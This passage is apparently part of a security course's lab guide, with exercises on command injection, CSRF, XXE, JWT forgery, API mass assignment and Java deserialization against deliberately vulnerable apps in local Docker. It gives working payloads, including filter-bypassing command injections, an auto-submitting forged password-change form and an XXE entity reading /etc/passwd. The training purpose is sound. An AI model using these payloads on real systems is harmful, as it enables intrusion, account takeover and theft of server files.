OS command injection happens the moment user input reaches a shell without being separated from the command it's concatenated into -- DVWA's Command Injection module is a textbook case: an 'ip' field is passed straight to a ping command, and the shell metacharacters ; | && let you chain your own command onto the end of it. This lab walks the same payload-evolution pattern as the rest of the DVWA modules: raw separator injection at Low, adapting to Medium's narrow (but incomplete) blacklist of the literal strings '&&' and ';', then to High's stricter blacklist that still leaves a documented gap in how it filters the pipe character. You'll finish by triggering the injected command blind -- using a time-delay payload to confirm execution when the response gives you no visible output -- the same technique real out-of-band command injection relies on when there's no reflected result to read.

**Docker:** `docker run -d -p 18080:80 ghcr.io/digininja/dvwa:latest`

**Completion evidence:** Screenshots showing the injected command's output (e.g. a whoami/id result) appended below the ping output at Low, Medium, and High security, plus a timed response showing an observed ~5 second delay from a sleep-based payload demonstrating blind execution.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080, log in with admin:password, click 'Create / Reset Database' if this is a fresh instance, open DVWA Security and set the level to Low, then open the Command Injection module
2. Low: submit 127.0.0.1; whoami (or 127.0.0.1 && whoami, 127.0.0.1 | whoami) in the IP field and confirm the injected command's output is appended below the ping result
3. Set Security to Medium. DVWA's medium filter only strips the literal substrings '&&' and ';', leaving the pipe character untouched -- submit 127.0.0.1 | whoami and confirm the same injection still works unmodified
4. Set Security to High. The filter now blacklists a longer list including '| ' (pipe followed by a space) -- submit 127.0.0.1|whoami with no space after the pipe and confirm the filter's exact-string match misses it
5. Set Security to Impossible and retry the same payload -- confirm it now fails because DVWA splits the input on '.' and requires all four octets to pass is_numeric() before rebuilding and using the IP, so any shell metacharacter breaks the numeric check and gets rejected outright; write one sentence naming that control
6. Back at Low or Medium, submit a time-delay payload such as 127.0.0.1 | sleep 5 and time the response to confirm the command executed even with no distinguishing output -- this is the same blind-confirmation technique used when a real target's response gives no visible result
7. Write 2-3 sentences on how the same time-delay technique generalizes to out-of-band command injection (e.g. triggering an outbound DNS lookup or HTTP request to an attacker-controlled listener) when a target has neither reflected output nor a timing side-channel to lean on directly

**Resources:**

- [DVWA (Damn Vulnerable Web Application) source repo](https://github.com/digininja/DVWA) _(tool)_
- [DVWA official container image (GitHub Container Registry)](https://github.com/digininja/DVWA/pkgs/container/dvwa) _(tool)_
- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection) _(link)_
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html) _(link)_

---

## L55: CSRF on DVWA

**Week 9** · Module `m9` · DVWA (Docker) · easy

Cross-site request forgery works because a browser will happily attach a victim's session cookie to a request the victim never intended to send -- DVWA's CSRF module changes a logged-in user's password through a plain GET request with zero anti-CSRF protection at Low, which means any page the victim's browser loads can trigger it. This lab has you craft a standalone, auto-submitting HTML page that forges that exact password-change request, host it outside DVWA, and load it while still logged in as the victim to prove the forged state change actually lands -- no phishing link click needed beyond the page simply loading. You'll then raise DVWA's security level and see the Referer-substring check Medium adds, and why it's still a weak defense compared to the session-bound token Impossible finally introduces.

**Docker:** `docker run -d -p 18080:80 ghcr.io/digininja/dvwa:latest`

**Completion evidence:** A screenshot of the standalone malicious HTML page's source, a screenshot of it auto-submitting while logged into DVWA, and a screenshot of successfully logging back into DVWA with the forged password -- proving the victim's account state changed from a page hosted entirely outside DVWA.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080, log in with admin:password, set DVWA Security to Low, and open the CSRF module
2. Change your password once through the normal form and, with your browser's network tab or Burp, confirm the exact request it sends: a GET to /vulnerabilities/csrf/?password_new=...&password_conf=...&Change=Change with no CSRF token in it at all
3. Create a standalone HTML file (host it with a simple local server, e.g. python -m http.server, or open it directly as a file) containing an auto-submitting form: <form action="http://localhost:18080/vulnerabilities/csrf/" method="GET"><input type="hidden" name="password_new" value="pwned123"><input type="hidden" name="password_conf" value="pwned123"><input type="hidden" name="Change" value="Change"></form><script>document.forms[0].submit()</script>
4. While still logged into DVWA in the same browser (standing in for the victim), open your malicious HTML page directly and watch it auto-submit with no visible confirmation dialog
5. Log out of DVWA and log back in using the forged password (pwned123) to prove the forged state change actually took effect
6. Set Security to Medium and repeat the same forged form -- note DVWA now checks whether the Referer header contains the app's own hostname substring, and explain in one sentence why that's a weak check rather than a real fix
7. Set Security to Impossible and repeat the same forged form once more -- confirm it now fails because the real form embeds a per-session user_token and also requires the current password, and write one sentence naming that control

**Resources:**

- [DVWA (Damn Vulnerable Web Application) source repo](https://github.com/digininja/DVWA) _(tool)_
- [DVWA official container image (GitHub Container Registry)](https://github.com/digininja/DVWA/pkgs/container/dvwa) _(tool)_
- [OWASP: Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf) _(link)_
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) _(link)_

---

## L56: XXE (XML External Entity) on WebGoat

**Week 10** · Module `m10` · WebGoat (Docker) · medium

XML parsers that resolve DOCTYPE-declared external entities by default turn any feature that accepts XML input into a way to read files off the server's own filesystem -- WebGoat's XXE lesson category teaches exactly that failure mode against a feature that normally exchanges data as XML. You'll intercept a request, inject a DOCTYPE with a SYSTEM entity pointing at a local file, and get its contents reflected back through a field that was never meant to expose the filesystem. The lesson then pushes further into blind XXE, where the response never reflects the file's contents directly, so proving the vulnerability means reasoning about out-of-band confirmation instead of reading an answer straight off the page -- the same escalation real-world XXE findings go through once developers patch the obvious reflected case but miss the underlying parser configuration.

**Docker:** `docker run -d -p 18080:8080 webgoat/webgoat`

**Completion evidence:** WebGoat's own lesson tracker showing a green 'Solved' indicator on the XXE lesson stages, with a screenshot of the intercepted XML request/response pair showing your DOCTYPE SYSTEM entity resolved and its file content reflected back.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/WebGoat -- the bare root returns nothing, WebGoat lives under the /WebGoat path -- and register your own account (or log in with the account from an earlier WebGoat lab)
2. Open the 'XXE' lesson category and read through its explanation of how a standard XML parser resolves a DOCTYPE-declared external entity by default, unless the application explicitly disables that behavior
3. Find the exercise's XML-accepting feature and, using your browser's dev tools or Burp, intercept the request it sends so you can edit the raw XML body directly
4. Inject a DOCTYPE declaring a SYSTEM entity pointing at a local file, e.g. <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>, and confirm the resolved file content is reflected back to you
5. Move to the lesson's blind/out-of-band XXE exercise, where the response no longer reflects the file's content directly -- follow the exercise's own guidance on triggering and confirming an out-of-band interaction (e.g. an externally-referenced DTD) to prove the entity still resolved even without a visible answer
6. Confirm WebGoat marks each completed stage solved with its green 'Solved' indicator
7. Write 2-3 sentences on why disabling DOCTYPE processing (or external entity resolution specifically) in the XML parser is the actual fix, rather than filtering or sanitizing the XML body

**Resources:**

- [WebGoat (GitHub)](https://github.com/WebGoat/WebGoat) _(tool)_
- [OWASP WebGoat project page](https://owasp.org/www-project-webgoat/) _(link)_
- [OWASP: XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) _(link)_
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) _(link)_

---

## L57: JWT Attacks on WebGoat

**Week 10** · Module `m10` · WebGoat (Docker) · medium

A JWT is only as trustworthy as the signature verification behind it, and WebGoat's JSON Web Tokens lesson category walks through two of the most common ways that verification breaks down in practice. First you decode a real token to see exactly what a JWT actually is -- three base64url segments, not an opaque blob -- then exploit a server that accepts an unsigned 'alg: none' token as if it were valid, and finally recover a signing secret weak enough to brute-force offline and use it to forge a token for a different identity. Both bugs share the same root cause: the server trusted the token's claims without actually verifying who could have produced that signature.

**Docker:** `docker run -d -p 18080:8080 webgoat/webgoat`

**Completion evidence:** WebGoat's own lesson tracker showing a green 'Solved' indicator on both JWT exercises, plus a screenshot of the accepted alg:none tampered token and the forged HS256 token signed with the recovered secret.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/WebGoat, and register your own account (or log in with an account from an earlier WebGoat lab)
2. Open the 'JSON Web Tokens' lesson category, obtain a token issued by the first exercise, and decode it at jwt.io (or manually by base64url-decoding each dot-separated segment) -- note the algorithm in the header and the claims in the payload
3. Work the alg:none exercise: change the header's "alg" value to "none", remove the signature segment entirely (keeping the trailing dot), tamper with a claim in the payload (e.g. your username or a role field), and submit the modified token -- confirm the server accepts it without verifying any signature
4. Work the weak-secret exercise: take the HS256-signed token from that stage and brute-force its signing secret offline with a wordlist, using hashcat (mode 16500, JWT) or jwt_tool's -C crack mode
5. Once you recover the secret, use it to sign a new token claiming a different user's identity, then submit that forged token against the exercise's protected endpoint and confirm it's accepted
6. Confirm WebGoat marks both stages solved with its green 'Solved' indicator
7. Write one sentence per finding naming the missing server-side control: failing to reject "alg: none" / enforce an allowed algorithm list, and using a signing secret weak enough to crack offline

**Resources:**

- [WebGoat (GitHub)](https://github.com/WebGoat/WebGoat) _(tool)_
- [OWASP WebGoat project page](https://owasp.org/www-project-webgoat/) _(link)_
- [jwt.io — JWT decoder](https://jwt.io) _(tool)_
- [jwt_tool (GitHub)](https://github.com/ticarpi/jwt_tool) _(tool)_
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) _(link)_

---

## L58: API BOLA & Mass Assignment on VAmPI

**Week 10** · Module `m10` · VAmPI (Docker) · medium

VAmPI is a small, intentionally vulnerable Flask REST API with no browser UI to lean on -- every finding here comes from reading and rewriting a raw JSON request. This lab has you register and log in to get a JWT, then chain two OWASP API Top 10 findings: Broken Object Level Authorization, where your own token is enough to pull a different user's account object just by changing the username in the URL, and Mass Assignment, where the registration endpoint accepts a field -- an admin flag -- that the client was never supposed to be able to set, letting you create a brand-new account that's already an admin with nothing more than an extra JSON key.

**Docker:** `docker run -d -p 18080:5000 erev0s/vampi`

**Completion evidence:** Request/response pairs showing the successful BOLA request (a different user's account object returned using your own token) and the mass-assignment registration request/response showing the newly created account's admin field set to true.

**Instructions:**

1. Click 'Start Lab' above, then confirm the API is reachable at http://localhost:18080/ -- you should get a JSON response, not a webpage -- and open the Swagger UI at http://localhost:18080/ui (or /docs) to see every available route before testing
2. Register two users via the /users/v1/register endpoint, then log in as the first one to obtain a JWT
3. Exploit Broken Object Level Authorization: using only user 1's JWT, request user 2's account object at the per-user endpoint (GET /users/v1/<username>) and confirm the API returns user 2's data without checking that the token belongs to that user
4. Exploit Mass Assignment: register a third account via POST /users/v1/register, but include an "admin": true field in the JSON body alongside username/password/email -- the endpoint isn't meant to let a caller set that field, but it silently accepts it
5. Confirm the escalation: log in as the new account to get its JWT, then call GET /me with Authorization: Bearer <that JWT> -- unlike the per-user endpoint used for the BOLA step, /me's response includes the admin field, so check whether it now reads true
6. Decode your own JWT at jwt.io and note its signing algorithm and claims
7. Write a short report: which OWASP API Top 10 category each finding maps to (Broken Object Level Authorization, Mass Assignment) and the exact request that triggered each

**Resources:**

- [VAmPI (GitHub)](https://github.com/erev0s/VAmPI) _(tool)_
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/) _(link)_
- [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html) _(link)_
- [jwt.io — JWT decoder](https://jwt.io) _(tool)_

---

## L59: Insecure Deserialization on WebGoat

**Week 10** · Module `m10` · WebGoat (Docker) · hard

Deserializing untrusted data means letting whoever sent it dictate the internal state -- and sometimes the behavior -- of objects your own server then trusts. WebGoat's Insecure Deserialization lesson hands you a base64-encoded, Java-serialized object (a task-holder carrying a task name and a requested execution time) exchanged with the client in a cookie or hidden field, and the exercise is only solved once you deserialize it, understand its fields, modify one, and replay a re-serialized version that changes the server's own observable behavior. Because the effect the lesson checks for is measurable -- a specific, verifiable delay -- you get concrete proof that you controlled server-side object state purely by crafting bytes, with no application logic bug exploited beyond the act of deserializing something you shouldn't have been trusted to write.

**Docker:** `docker run -d -p 18080:8080 webgoat/webgoat`

**Completion evidence:** WebGoat's own lesson tracker showing a green 'Solved' indicator on the Insecure Deserialization lesson, plus a screenshot of the decoded original object's fields alongside your modified, re-serialized replacement and the server's resulting measured delay.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/WebGoat, and register your own account (or log in with an account from an earlier WebGoat lab)
2. Open the 'Insecure Deserialization' lesson category and read its explanation of why deserializing untrusted data with Java's ObjectInputStream lets the sender control the resulting object's state
3. Using dev tools or Burp, locate the base64-encoded serialized object the lesson exchanges with the client (typically in a cookie or hidden field) and base64-decode it to inspect the raw serialized bytes
4. Identify the object's class and fields -- it's a task-holder object carrying a task name and a requested execution time -- either by inspecting the lesson's own source/decompiled class or by reasoning from the serialized field names visible in the decoded bytes
5. Write or adapt a small Java program to deserialize the object, modify its requested-execution-time field to a specific value the lesson can verify, and re-serialize it back to bytes
6. Base64-encode the modified object and replace the original cookie/field value with it, then submit the request
7. Confirm the server's observed delay matches the value you set -- proving you controlled server-side behavior purely through the deserialized object's state -- and check that WebGoat marks the lesson solved
8. Write 2-3 sentences on why deserializing this object without validating its class or field values is equivalent to trusting arbitrary attacker-supplied object state, and what a safer alternative (allow-listing deserializable classes, or switching to a data format like JSON with no executable-object surface) would look like

**Resources:**

- [WebGoat (GitHub)](https://github.com/WebGoat/WebGoat) _(tool)_
- [OWASP WebGoat project page](https://owasp.org/www-project-webgoat/) _(link)_
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) _(link)_
- [OWASP: Insecure Deserialization](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data) _(link)_

---

